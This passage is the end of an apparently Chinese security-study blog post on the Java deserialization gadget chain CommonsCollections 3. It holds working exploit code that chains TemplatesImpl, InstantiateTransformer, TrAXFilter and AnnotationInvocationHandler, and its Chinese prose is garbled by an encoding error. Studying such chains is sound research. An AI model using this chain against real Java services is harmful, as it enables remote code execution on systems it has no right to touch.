class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templatesimpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]{Templates.class},<span class="keyword">new</span> <span class="title class_">Object</span>[]{templatesimpl});</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">            instantiateTransformer</span><br><span class="line">        });</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">"value"</span>,<span class="string">"v"</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,ctf);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerconstructor</span> <span class="operator">=</span> annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">"ser.bin"</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>å®Œæ•´çš„CC3è°ƒç”¨é“¾ï¼Œå½“InvokerTransformerè¢«banæ—¶å°±å¯ä»¥ç”¨è¿™æ¡é“¾ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143659042.png"></p>

            </div>

            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#Javaååºåˆ—åŒ–</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2023/05/30/CommonsCollections-2-4-5-7/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">CommonsCollections 2+4+5+7</span>
                                <span class="post-nav-item">ä¸Šä¸€ç¯‡</span>
                            </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2023/05/18/CommonsCollections1-6/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">CommonsCollections1+6</span>
                                <span class="post-nav-item">ä¸‹ä¸€ç¯‡</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
                <div class="comment-container">
                    
<div class="comments-container">
    <div id="comments-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments"></i>&nbsp;è¯„è®º
    </div>
    
        
            

    <div class="valine-container">
        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script data-pjax>
          function loadValine() {

            const config = {
              el: '#vcomments',
              appId: 'yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI',
              appKey: '7gIuYJ9YQk94en6wRudankYd',
              meta: ['nick', 'mail', 'link'],
              avatar: 'wavatar',
              enableQQ: true,
              placeholder: 'Hi speak somethingï¼',
              lang: 'zh-CN'.toLowerCase()
            }

            if ('https://ycemvr5n.api.lncldglobal.com') {
              config.serverURLs = 'https://ycemvr5n.api.lncldglobal.com'
            }

            new Valine(config)

            function getAuthor(language) {
              switch (language) {
                case 'en':
                  return 'Author'
                case 'zh-CN':
                  return 'åšä¸»'
                default:
                  return 'Master'
              }
            }

            // Add "Author" identify
            const getValineDomTimer = setInterval(() => {
              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
              if (vcards.length > 0) {
                let author = 'y1zh3e7'

                if (author) {
                  for (let vcard of vcards) {
                    const vnick_dom = vcard.querySelector('.vhead .vnick')
                    const vnick = vnick_dom.innerHTML
                    if (vnick === author) {
                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                    }
                  }
                }
                clearInterval(getValineDomTimer)
              } else {
                clearInterval(getValineDomTimer)
              }
            }, 2000)
          }

          if ('true' === 'true') {
            const loadValineTimeout = setTimeout(() => {
              loadValine()
              clearTimeout(loadValineTimeout)
            }, 1000)
          } else {
            window.addEventListener('DOMContentLoaded', loadValine)
          }
        </script>
    </div>



        
    
</div>

                </div>
            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CC1%E6%89%93%E4%B8%8D%E9%80%9A%E6%97%B6%E7%9A%84%E5%8F%A6%E5%A4%96%E4%B8%80%E6%9D%A1%E9%93%BECC3"><span class="nav-text">CC1æ‰“ä¸é€šæ—¶çš„å¦å¤–ä¸€æ¡é“¾CC3</span></a></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2023</span> -
            
            2023
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">y1zh3e7</a>
            
        </div>
        
            <script async data-pjax
                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    è®¿é—®äººæ•°&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                
                
                    æ€»è®¿é—®é‡&nbsp;<span id="busuanzi_value_site_pv"></span>
                
            </div>
        
        <div class="theme-info info-item">
            ç”± <a target="_blank" href="https://hexo.io">Hexo</a> é©±åŠ¨&nbsp;|&nbsp;ä¸»é¢˜&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="æœç´¢..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>




    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>


<div class="post-scripts pjax">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
        
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
        
    
</div>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
